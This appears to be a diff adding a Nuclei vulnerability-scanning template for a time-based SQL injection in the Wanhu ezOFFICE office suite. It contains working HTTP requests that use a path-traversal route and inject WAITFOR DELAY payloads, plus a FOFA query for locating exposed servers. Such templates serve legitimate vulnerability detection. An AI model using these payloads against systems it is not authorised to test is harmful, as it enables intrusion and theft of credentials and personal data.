@@ -1,0 +1,40 @@
+id: wanhu-ezOFFICE-SignatureEditFrm_jsp-sql
+
+info:
+  name: "万户 ezOFFICE SignatureEditFrm.jsp SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="万户网络-ezOFFICE"
+      该漏洞允许攻击者通过构造恶意SQL语句，从数据库中提取敏感信息，包括管理员后台凭证及用户个人数据。在具备高权限的情况下，攻击者可能进一步利用该漏洞向服务器写入恶意文件，从而实现对服务器系统的控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488988&idx=1&sn=97902a623e312af600c0ff3bf2d9a1ed&chksm=c267a0eff51029f9058979100aebc5f4ac9bab56b2038b45565c82ff6b088eb403d3ee3a0f2f&token=314927155&lang=zh_CN#rd
+  tags: 万户
+
+
+
+http:
+- raw:
+  - |
+    GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:4%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+  - |
+    GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iWebRevision.jsp/Signature/SignatureEditFrm.jsp?SignatureID=1;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
+
